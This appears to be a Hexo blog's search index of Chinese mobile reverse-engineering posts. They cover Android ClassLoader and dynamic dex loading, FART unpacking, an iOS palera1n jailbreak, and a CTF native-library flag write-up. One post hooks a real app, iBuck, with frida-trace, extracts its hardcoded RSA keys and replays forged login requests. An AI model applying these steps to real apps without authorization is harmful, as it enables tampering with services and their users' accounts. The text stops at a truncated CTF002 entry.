<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ClassLoader和动态加载</title>
      <link href="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/"/>
      <url>/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<p>这里是加壳的一些前置原理，主要是基于Android8.0中ClassLoader的双亲委派模式原理和代码验证以及动态加载的代码验证</p><span id="more"></span><h2 id="类加载器ClassLoader"><a href="#类加载器ClassLoader" class="headerlink" title="类加载器ClassLoader"></a>类加载器ClassLoader</h2><p>Android的dalvik和art虚拟机都是继承于JVM的一种实现，是基于寄存器来实现的，这是和<strong>JVM</strong>不同的点</p><ul><li><p>JVM的类加载器包括三种：每一个作用都是不一样的</p><ol><li><p>Bootstrap ClassLoader（引导类加载器）：C/C++代码实现的加载器，用于<strong>加载指定的JDK的核心类库</strong>，比如java.lang、java.uti。等这些系统类。java虚拟机的启动就是通过Bootstrap，该ClassLoader在java里无法获取，负责加载*/lib*下的类，这些类在java中是没有办法获取到的。</p></li><li><p>Extensions ClassLoader（扩展类加载器）：Java中的实现类为ExtClassLoader，提供了除了系统类之外的额外功能，可以在java里获取，负责加载/lib/ext下的类。</p></li><li><p>Application ClassLoader（应用程序类加载器）：<em>java开发人员接触最多的</em>。Java中的实现类为AppClassLoader是与我们接触最多的类加载器，开发人员写的代码默认就是由它来加载，ClassLoader.getSystemClassLoader返回的就是它。</p></li><li><p>也可以自定义类加载器，只需要通过继承java.lang.ClassLoadr类的方式来实现自己的类加载器即可。</p><ul><li>加载顺序：<ol><li>Bootstrap ClassLoader</li><li>Extension ClassLoader</li><li>Application ClassLoader</li></ol></li></ul><img src="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230819104158555.png" class="" title="image-20230819104158555"></li></ol></li></ul><p>双亲委派：</p><ul><li>双亲委派模式的工作原理是；如果一个类加载器收到了类加载请求，他并不会自己先去加载，而是把这个委托给弗雷德加载器去执行，如果父类加载器还存在其自己的父类加载器，则进一步向上委托，依次递归，<strong>请求最终将到达顶层的启动类加载器</strong>，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式，即每个儿子都不愿意干活，每次有活就丢给父亲去干，直到父亲说这件事我也干不了时，儿子自己想办法去完成，这个就是双亲委派。</li><li>为什么要有双亲委派？<ol><li>避免重复加载，如果已经加载过一次Class，可以直接读取已经加载的Class</li><li>更加安全，无法自定义类来替代系统的核心类，可以防止核心API库被随意篡改</li></ol></li></ul><p>类加载：</p><ul><li><p>隐式加载：</p><p>创建类的实例</p><p>访问类的静态变量，或者为静态变量赋值</p><p>调用类的静态方法</p><p>使用反射方式来强制创建某个类或接口对应的java.lang.Class对象</p><p>初始化某个类的子类</p></li><li><p>显示加载：</p><p>使用LoadClass()加载</p><p>使用ForName()加载</p></li><li><p>在JVM中加载类的步骤</p><ol><li>装载：查找和导入Class文件</li><li>链接：其中解析步骤是可以选择的<ol><li>检查：检查载入的class文件数据的正确性</li><li>准备：给类的静态变量分配存储空间</li><li>解析：将符号引用转成直接引用</li></ol></li><li>初始化：即调用<clinit>函数，对静态变量、静态代码块执行初始化工作</clinit></li></ol><img src="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230819104826308.png" class="" title="image-20230819104826308"></li></ul><p>ClassLoader的继承关系：InMemoryDexClassLoader为Android8.0新引入的ClassLoader</p><img src="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230819104952543.png" class="" title="image-20230819104952543"><ul><li><p>Android系统中与ClassLoader相关的一共有8个：</p><p>ClassLoader为抽象类；</p><p>BootClassLoader预加载常用类，单例模式。与Java中的BootClassLoader不同，他并不是由C/C++代码实现，而是由Java实现的；</p><p>BaseDexClassLoader是PathClassLoader、DexClassLoader、InMemoryDexClassLoader的父类，类加载的主要逻辑都是在BaseDexClassLoader完成的。</p><p>SecureClassLoader继承了抽象类ClassLoader，扩展了ClassLoader类加入了权限方面的功能，加强了安全性，其子类URLClassLoader是用URL路径从jar文件中加载类和资源。</p><p>其中重点关注的是PathClassLoader和DexClassLoader。</p><p>PathClassLoader是Android默认使用的类加载器，一个apk中的Activity等类便是在其中加载。</p><p><strong>DexClassLoader可以加载任意目录下的dex/jar/apk/zip文件，比PathClassLoader更灵活，是实现插件化、热修复以及dex加壳的重点。</strong></p><p>Android8.0新引入InMemroyDexClassLoader，从名字就可以看出是用于直接从内存中加载dex。</p></li></ul><p>用代码验证一下是否能获取到父类加载器：编码使用<strong>kotlin</strong></p><pre><code class="kotlin">package com.example.classloadertestimport androidx.appcompat.app.AppCompatActivityimport android.os.Bundleimport android.util.Logclass MainActivity : AppCompatActivity() {    override fun onCreate(savedInstanceState: Bundle?) {        super.onCreate(savedInstanceState)        setContentView(R.layout.activity_main)        testClassLoader()    }    public fun testClassLoader() {        var thisClassloader = MainActivity::class.java.classLoader // 获取当前类的类加载器        Log.i("kanxue","thisClassLoader: " + thisClassloader)        var parentClassloader = thisClassloader.parent // 获取父类加载器        while (parentClassloader != null){            Log.i("kanxue","this: " + thisClassloader + "..." + parentClassloader)            val tmpClassloader = parentClassloader.parent // 获取父类加载器的父类加载器            thisClassloader = parentClassloader // 更新当前类加载器为父类加载器            parentClassloader = tmpClassloader // 更新父类加载器为父类加载器的父类加载器        }        Log.i("kanxue","root: " + thisClassloader) // 输出根类加载器    }}</code></pre><p>打印结果：</p><pre><code>thisClassLoader: dalvik.system.PathClassLoader[DexPathList[[zip file "/data/app/com.example.classloadertest-xAcs1S3DFPHFAwYBO7fLbA==/base.apk"],nativeLibraryDirectories=[/data/app/com.example.classloadertest-xAcs1S3DFPHFAwYBO7fLbA==/lib/arm64, /system/lib64, /vendor/lib64, /system/product/lib64]]]this: dalvik.system.PathClassLoader[DexPathList[[zip file "/data/app/com.example.classloadertest-xAcs1S3DFPHFAwYBO7fLbA==/base.apk"],nativeLibraryDirectories=[/data/app/com.example.classloadertest-xAcs1S3DFPHFAwYBO7fLbA==/lib/arm64, /system/lib64, /vendor/lib64, /system/product/lib64]]]...java.lang.BootClassLoader@29144afroot: java.lang.BootClassLoader@29144af</code></pre><p>小结：</p><ul><li>这里我们简单的验证了一下双亲验证的关系，这是非常重要的一个点。如果双亲委派没有搞好，开发插件的时候当中的类会出现<em>notfoundClass</em>的问题，或者我们使用四大组件中的<strong>activity、service</strong>出现系统没有管理，不能正常工作，可能都是这个ClassLoader这个环节的问题。</li><li>如果写xposed插件的话会经常用到这个</li><li>frida框架的话会自动帮我们处理好这个问题（会通过反射帮我们找到最终app所在的classloader）</li></ul><p>接下来再写代码验证一下动态加载dex</p><ul><li><p>loaddex01</p><pre><code class="kotlin">package com.kanxue.loaddex01import android.content.Contextimport android.content.pm.PackageManagerimport androidx.appcompat.app.AppCompatActivityimport android.os.Bundleimport android.util.Logimport dalvik.system.DexClassLoaderclass MainActivity : AppCompatActivity() {    override fun onCreate(savedInstanceState: Bundle?) {        super.onCreate(savedInstanceState)        setContentView(R.layout.activity_main)        // 获取外部存储的读取权限状态        val readPermission = checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)        if (readPermission != PackageManager.PERMISSION_GRANTED) {            // 请求外部存储的读取权限            requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST_CODE)        } else {            // 已有读取权限，可以加载 DEX 文件            val appContext = this.applicationContext            val dexFilePath = "/sdcard/1.dex" // 这里替换为你的 DEX 文件路径            testDexClassLoader(appContext, dexFilePath)        }    }    // 权限请求回调    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array&lt;out String&gt;, grantResults: IntArray) {        super.onRequestPermissionsResult(requestCode, permissions, grantResults) // 调用父类的方法        if (requestCode == PERMISSION_REQUEST_CODE) {            if (grantResults.isNotEmpty() &amp;&amp; grantResults[0] == PackageManager.PERMISSION_GRANTED) {                val appContext = this.applicationContext                val dexFilePath = "/sdcard/1.dex" // 这里替换为你的 DEX 文件路径                testDexClassLoader(appContext, dexFilePath)            } else {                // 权限被拒绝，你可以在这里处理相应的操作，如给用户一个提示等                Log.i("TAG", "权限请求被拒绝")            }        }    }    // 在testDexClassLoader函数中关闭加载器    private fun testDexClassLoader(context: Context, dexFilePath: String) {        val optFile = context.getDir("opt_dex", 0)        val libFile = context.getDir("lib_path", 0)        var dexClassLoader: DexClassLoader? = null        try {            // 创建 DexClassLoader            dexClassLoader = DexClassLoader(                dexFilePath,                optFile.absolutePath,                libFile.absolutePath,                context.classLoader            )            // 加载类并调用方法            val loadedClass = dexClassLoader.loadClass("com.kanxue.test.TestClass")            val instance = loadedClass.getDeclaredConstructor().newInstance()            val method = loadedClass.getDeclaredMethod("testFunc")            method.invoke(instance)        } catch (e: ClassNotFoundException) {            e.printStackTrace()            // 处理类未找到异常        } catch (e: Exception) {            e.printStackTrace()            // 处理其他异常        }    }    companion object {        private const val PERMISSION_REQUEST_CODE = 1    }}</code></pre></li><li><p>TestClass：构建一个apk，把它里面的dex拿出来用作动态加载</p><pre><code class="kotlin">package com.kanxue.testimport android.util.Logpublic class TestClass {    public fun testFunc() {        Log.i("kanxue","i an from com.example.test.TestClass.testFunc")    }}</code></pre></li><li><p>执行结果</p><img src="/2023/08/19/ClassLoader%E5%92%8C%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/image-20230819111748251.png" class="" title="image-20230819111748251"><ul><li>执行的时候第一次加载dex是失败的因为dex没有加载进去，重新运行第二次就好了。</li></ul></li><li><p>小结：</p><ul><li><p>这个项目有一些需要注意的点</p><ol><li><p>需要在loaddex01项目的<em>AndroidManifest.xml</em>中配置外部存储读写权限</p></li><li><p>需要修改build.gradle文件配置，（用java开发可能不用修改，回头测试一下）</p><pre><code>android {    ...    compileSdk 33// 新生成的项目是32需要修改到33或33以上    }</code></pre></li><li><p>然后就是权限问题了，需要在<em>loaddex01</em>的代码中实时获取权限，不然在Android8.0中还是读取不到我们放在外部存储卡的dex文件。</p></li></ol></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android加壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向分析和脱壳的意义</title>
      <link href="/2023/08/19/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%92%8C%E8%84%B1%E5%A3%B3%E7%9A%84%E6%84%8F%E4%B9%89/"/>
      <url>/2023/08/19/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%92%8C%E8%84%B1%E5%A3%B3%E7%9A%84%E6%84%8F%E4%B9%89/</url>
      
        <content type="html"><![CDATA[<p>这里是脱壳的一些碎碎念和FART脱壳机的使用流程</p><span id="more"></span><h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><ul><li>app解压看文件也能看出来是否加壳</li><li>用Android killer等工具也能查看：AndroidManifest.xml里面有入口包名，但是找不到这个文件可能是dex加壳了当然也可能是解析错误，一半都可以看到包名特征（这类工具还有：GDA、jadx。。。）</li><li>现在国内应用商城大部分应用都加壳了，除了一些大型应用和对效率要求比较高的应用，googleplay倒是没有强制要求加壳。苹果商店加的是苹果的壳，自动脱壳机就能脱。</li></ul><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><ul><li>逆向分析过程中的点：<ol><li>持之以恒的精神：更多的时候是死磕专业安全人员编写的代码。</li><li>耐心：因为分析的东西比较多包括混淆、加壳、so文件等等保护手段。尽量在每次分析过程中都有所提高，而不是去进行一些重复的工作。</li></ol></li><li>一些时候安全软件可能会把加壳的应用识别为木马</li><li>一些书籍：<ul><li>非虫《Android软件安全与逆向分析》（对逆向分析怎么做有一个大概的流程）</li><li>姜维《Android应用安全防护和逆向分析》（偏向应用方面，对加壳的手段为什么这么加壳有一定的了解，以及未来的发展前景有一定估计）</li><li>邓凡平《深入理解Android：Java虚拟机ART》（难度比较大：可以先看能看懂的地方。主要从源码的角度去看ART的实现，如果能看懂这本书，那么ART对于我们来说也就是一些C/C++代码了可以很轻松的进行定制来跟踪记录app的运行轨迹可以做自己的应用沙盒来辅助逆向分析可以事半功倍）</li></ul></li><li>一定要会正向开发才能做好逆向分析，比如什么是四大组件？app的运行流程？等等。。</li><li>攻防一体，只有先懂得了加壳原理才知道为什么别人这么脱壳，甚至是定制属于自己的脱壳手段，写一个类似于FART的脱壳工具</li><li>逆向分析的一般流程：<ol><li>使用自动化检测工具检测apk是否加壳，或者用反编译工具判断是否加壳</li><li>如果加壳，需要对apk进行脱壳</li><li>使用jeb、jadx、apktool等反编译工具对apk进行反编译</li><li>先依据静态分析中得到的关键字符串、关键api调用等方法快速定位需要分析的关键函数和流程</li><li>如果依据简单的字符串、关键api无法快速定位，这时候apk可能是用了字符串加密、反射调用等手段，此时可结合hook、动态调试等</li><li>定位到关键函数后，再根据是java实现还是jni实现进行一步步分析，如果是java实现的话往往根据静态的分析就能得出结果，如果是在so中的函数那么分析难度会较大一些。</li></ol></li></ul><h2 id="使用FART脱壳机进行脱壳"><a href="#使用FART脱壳机进行脱壳" class="headerlink" title="使用FART脱壳机进行脱壳"></a>使用FART脱壳机进行脱壳</h2><h3 id="制作脱壳机"><a href="#制作脱壳机" class="headerlink" title="制作脱壳机"></a>制作脱壳机</h3><ul><li><p>本次脱壳机设备：nexus5</p></li><li><p>制作脱壳机流程</p><ol><li><p>先进入bootloader</p><p><code>adb reboot bootloader</code></p></li><li><p>执行FART的对应设备型号的镜像刷入脱壳机</p><ul><li>执行镜像中的<strong>flash-all.bat</strong>文件</li></ul></li></ol></li></ul><h3 id="使用脱壳机"><a href="#使用脱壳机" class="headerlink" title="使用脱壳机"></a>使用脱壳机</h3><ul><li><p>直接安装apk，并执行就可以了</p><ul><li><p>需要注意的点</p><ol><li>是本次使用的脱壳机镜像需要在手机设置里面给app读写读写文件权限</li><li>测试的时候有个app没有文件读写的功能，所以没法给读写权限所以脱壳失败，因为没法写入到存储卡</li><li>这个版本的脱壳机将脱壳文件写在了**/sdcard/fart/**目录下</li></ol></li><li><p>如果权限正常执行apk后就会在**/sdcard/fart/**目录下生成脱壳后的文件</p><img src="/2023/08/19/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%92%8C%E8%84%B1%E5%A3%B3%E7%9A%84%E6%84%8F%E4%B9%89/image-20230819100828350.png" class="" title="image-20230819100828350"></li></ul></li><li><p>脱壳出来的dex的魔术头可能会被抹掉导致反编译工具不识别</p><ul><li>有这种情况就打开一个正常的dex文件，把它的前八个字节替换过来就好了</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ios15.7.5越狱</title>
      <link href="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/"/>
      <url>/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/</url>
      
        <content type="html"><![CDATA[<p>15一下的系统可以使用<strong>CheckRa1n</strong>越狱，15以上的可以使用<strong>palera1n</strong>来越狱。两个工具的流程都差不多。</p><p>IOS每次重启之后需要重新越狱。</p><p>这里使用制作启动盘的方式来进行刷机，使用balenaEtcher制作就行不多赘述。</p><ol><li>进去启动盘之后</li></ol><p>选择Options，进去后，选择Create Faksfs，空格键选中，回车确认！返回之后，一定要确认左上角有-f -c参数</p><img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222036105.png" class="" title="image-20230709222036105"><p>选择Start开始越狱，此时会自动引导手机进入恢复模式</p><img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222046618.png" class="" title="image-20230709222046618"><p>1回车<br>2.将手机电源键和HOME键一起按住(4秒)<br>3.松开电源键，但是保持按住HOME按钮(10秒)<br>4,手机开始自动跑代码，电脑出现进度条，就可以松开按键~</p><img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222058624.png" class="" title="image-20230709222058624"><p><strong>解决办法</strong>：1，按 Ctrl +C 键取消越狱，不要重启手机。回车，输入palera1n_menu，重新开启越狱菜单。2，再次选择Start越狱</p><img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222115864.png" class="" title="image-20230709222115864"><img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222124273.png" class="" title="image-20230709222124273"><p>重启完成后，iOS设备进入系统之后，重新启动电脑，选择U盘启动，再次来到越狱工具界面，选择Start开始（注意！！！这次不需要选Options，不要选择Create Faksfs），进入第二阶段越狱。</p><p>按照前面步骤一样，提示Press Enter when ready for DFU mode后，回车，按照上面步骤操作iOS设备，让它进入DFU模式</p><p>如果还是不成功，再重复一遍<strong>解决办法</strong></p><img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222142737.png" class="" title="image-20230709222142737"><p>越狱完成重启后</p><img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222215384.png" class="" title="image-20230709222215384"><p>点击进入palera1n</p><img src="/2023/07/09/ios15-7-5%E8%B6%8A%E7%8B%B1/image-20230709222231723.png" class="" title="image-20230709222231723"><p>点击Install，安装越狱环境。这一步，依据网络的不同，有些朋友可能需要很久，甚至会失败。失败就重新来。（如果不行就挂梯子，设置wifi的代理用开了梯子主机的ip和梯子端口）</p><p>安装完成后，点击注销Respring即可，恭喜你！越狱完成！</p><p>Substitute的安装：进入Sileo，搜索Substitute安装，现在可以启用插件支持！</p><p>越狱完成！结束，开始享受越狱！</p>]]></content>
      
      
      <categories>
          
          <category> ios逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 越狱 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA加解密-iBuck</title>
      <link href="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/"/>
      <url>/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/</url>
      
        <content type="html"><![CDATA[<p><strong>rsa加解密</strong></p><ul><li>RSA加密属于一种非对称加密算法，对于相同内容的每次加密结果也都是不一样的，但是用私钥解密后的结果却都是可还原的</li></ul><p>rsa生成的密匙对</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709153627907.png" class="" title="image-20230709153627907"><p>可以通过RSA的私钥提取公钥</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709153656153.png" class="" title="image-20230709153656153"><p>公钥提取modulus（模数）</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709153710904.png" class="" title="image-20230709153710904"><h3 id="1-分析iBuck登录加解密"><a href="#1-分析iBuck登录加解密" class="headerlink" title="1. 分析iBuck登录加解密"></a>1. 分析iBuck登录加解密</h3><p>本章只分析软件的登录加解密验证</p><h4 id="fiddler抓登陆包"><a href="#fiddler抓登陆包" class="headerlink" title="fiddler抓登陆包"></a>fiddler抓登陆包</h4><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709153900282.png" class="" title="image-20230709153900282"><p><strong>先通过frida-trace 寻找RSA加解密相关的函数接口</strong></p><p><code>frida-trace -m "*[* *rsa*]" -U iBuck</code></p><p><strong>找到相关函数接口</strong></p><p>+[BKDataEncrypManger bk_rsaDecryptForJson:0x280848cc0]<br>+[BKDataEncrypManger bk_rsaEncrypJsonForDictionary:0x282664b80]</p><p>然后可以通过hook接口获取到参数信息</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154215964.png" class="" title="image-20230709154215964"><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154238135.png" class="" title="image-20230709154238135"><p>再通过rsa的通杀脚本来获取密钥相关的信息</p><p><code>frida -U iBuick -l .\ios_rsa.js</code></p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154315544.png" class="" title="image-20230709154315544"><p>接下来去ida解析的字符串里面搜索一下RSA公钥的编码特征看是否能搜到：一般是<strong>MIGfMA0</strong>开头的</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154348971.png" class="" title="image-20230709154348971"><p>直接搜索到了三组硬编码，那接下来可以解析一下这三个硬编码的模数看哪一个和我们刚刚通过RSA通杀脚本获取到的模数相同。</p><p>通过计算获取到正确的那一组硬编码</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154420182.png" class="" title="image-20230709154420182"><p>确定了之后，先在ida里面查看一下这个公钥的调用，通过交叉引用找到调用的函数</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154434989.png" class="" title="image-20230709154434989"><p>到了这边之后发现只是返回了一个公钥的值，继续再往上一层查看可以跟到下图解密函数</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154446127.png" class="" title="image-20230709154446127"><p>有点奇怪，第二天使用frida的时候报错</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154504743.png" class="" title="image-20230709154504743"><ul><li>不知道是哪里的问题，重启刷机好了</li></ul><p>找到这个解密函数之后，可以对解密函数进行hook查看它的参数和返回结果去验证他的解密过程</p><p><em>插入log获取参数和返回值</em></p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154558580.png" class="" title="image-20230709154558580"><p>执行hook</p><p><code>frida-trace -m "*[BKRSA decryptString:publicKey*]" -U iBuick</code></p><p>重新点击登录查看参数和返回值的值</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154622285.png" class="" title="image-20230709154622285"><p><strong>从这里可以获知两点：</strong></p><p>a. 未解密字符串的值是服务器的返回包，可以在fiddler里面找到</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154641117.png" class="" title="image-20230709154641117"><p>b. 这个公钥是用来解密返回包的，解密的返回值是**{}**</p><p>既然它是用公钥来解密服务端返回的数据包，这里我们可以猜测这个加密逻辑是：</p><p>​在客户端使用公钥加密-&gt;发送到服务器用私钥解密</p><p>​在服务端使用私钥加密-&gt;发送给客户端用公钥解密</p><p>来验证确认一下：</p><p>在ida里面搜索加密相关函数发现使用公钥私钥的都有，那我们接下来使用<em>frida-trace</em>来hook确认一下解密服务器返回包的时候调用的是哪个函数</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154712851.png" class="" title="image-20230709154712851"><p><code>frida-trace -m "*[BKRSA enc*]" -U iBuick</code></p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154727247.png" class="" title="image-20230709154727247"><p>根据hook返回结果发现是使用BKRSA encryptString:privateKey函数私钥加密，那接下来插入log来查看一下它的参数和返回值</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154757109.png" class="" title="image-20230709154757109"><p>执行hook</p><p><code>frida-trace -m "*[BKRSA encryptString:privateKey*]" -U iBuick</code><br>返回值：</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154818632.png" class="" title="image-20230709154818632"><p>接下来验证一下：</p><ol><li>用公钥解密服务器下发的data包</li></ol><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154835268.png" class="" title="image-20230709154835268"><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154844888.png" class="" title="image-20230709154844888"><ol start="2"><li>用私钥加密重放发送给服务器看能否通过验证</li></ol><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154906562.png" class="" title="image-20230709154906562"><p>验证通过，和我们点击登录返回相同的结果（这个app有限时防重放机制，发送时间过去太长的包重放是会失败的）</p><img src="/2023/07/09/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86-iBuck/image-20230709154939287.png" class="" title="image-20230709154939287"><p>根据验证的结果发现，本app在客户端有两对密匙，两种加密方式，一种是使用公钥加密服务端私钥解密，一种是使用私钥加密服务端公钥解密</p><p>关于这个app加固可以把客户端存储的密钥进行加密，例如将密钥存储为文件通过解密文件解析出公钥会让安全性更高一点</p>]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 加密解密 </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF001</title>
      <link href="/2023/07/09/CTF001/"/>
      <url>/2023/07/09/CTF001/</url>
      
        <content type="html"><![CDATA[<img src="/2023/07/09/CTF001/image-20230709145814540.png" class="" title="image-20230709145814540"><h3 id="用jadx分析代码逻辑"><a href="#用jadx分析代码逻辑" class="headerlink" title="用jadx分析代码逻辑"></a>用jadx分析代码逻辑</h3><p>先查一下程序没有加壳，用jadx打开apk查看代码</p><img src="/2023/07/09/CTF001/image-20230709145835648.png" class="" title="image-20230709145835648"><p>通过_<strong>AndroidManifest.xml</strong><em>找到程序的入口点可以看到提示的字符串<br>然后因为它处理flag的函数是在native层所以我们需要用ida去查看这个函数是怎么在<strong>so文件</strong>中实现的<br>用解压缩软件取出apk的lib库中的so文件，用ida去分析一下<br>ida分析完后在文件中我们可以直接搜索</em><strong>java开头的函数</strong>_或者直接搜索<strong>verify</strong>这个函数，有可能可以直接搜索到<br>如果我们搜索不到verify这个函数的时候也许这个函数是动态注册的，可以通过<strong>JNI_OnLoad</strong>去查找加载的函数<br>JNI_OnLoad()函数是Java Native Interface（JNI）中的一个特殊函数，它在加载本地库时由Java虚拟机调用，它主要用于初始化本地库，并返回JNI的版本号给虚拟机。</p><img src="/2023/07/09/CTF001/image-20230709145854617.png" class="" title="image-20230709145854617"><p>但是这里ida分析的参数有点错误</p><h4 id="修复IDA参数识别错误"><a href="#修复IDA参数识别错误" class="headerlink" title="修复IDA参数识别错误"></a>修复IDA参数识别错误</h4><p>看一下JNI_OnLoad()的代码示例</p><img src="/2023/07/09/CTF001/image-20230709145909806.png" class="" title="image-20230709145909806"><p>我们需要去找这个<strong>RegisterNatives()<strong>方法中的第三个参数</strong>methods</strong>来找到注册的本地方法，但是上面IDA识别的有问题需要手动修改一下参数的类型</p><img src="/2023/07/09/CTF001/image-20230709145922233.png" class="" title="image-20230709145922233"><img src="/2023/07/09/CTF001/image-20230709145928563.png" class="" title="image-20230709145928563"><img src="/2023/07/09/CTF001/image-20230709145933873.png" class="" title="image-20230709145933873"><p>修复完成</p><img src="/2023/07/09/CTF001/image-20230709145946280.png" class="" title="image-20230709145946280"><h4 id="定位动态注册函数地址"><a href="#定位动态注册函数地址" class="headerlink" title="定位动态注册函数地址"></a>定位动态注册函数地址</h4><p>进来之后就可以定位到动态注册的函数位置</p><img src="/2023/07/09/CTF001/image-20230709150003399.png" class="" title="image-20230709150003399"><p>进来之后发现这是一个简单的算法验证器，对数组的每一位进行了校验</p><img src="/2023/07/09/CTF001/image-20230709150015769.png" class="" title="image-20230709150015769"><h3 id="验证Flag"><a href="#验证Flag" class="headerlink" title="验证Flag"></a>验证Flag</h3><p>先验证一下长度，然后对每一位进行验证全部相等就返回true，我们可以将这些验证的数字转译对应的ascii码，或者直接按<em>table键</em>进入反汇编页面就能看到IDA自动解析的字符编码</p><img src="/2023/07/09/CTF001/image-20230709150057728.png" class="" title="image-20230709150057728"><img src="/2023/07/09/CTF001/image-20230709150104981.png" class="" title="image-20230709150104981"><p>将字符串输入验证</p><img src="/2023/07/09/CTF001/image-20230709150119452.png" class="" title="image-20230709150119452">]]></content>
      
      
      <categories>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF002</title>
      <link href="/2023/07/09/CTF002/"/>
      <url>/2023/07/09/CTF002/</url>
      
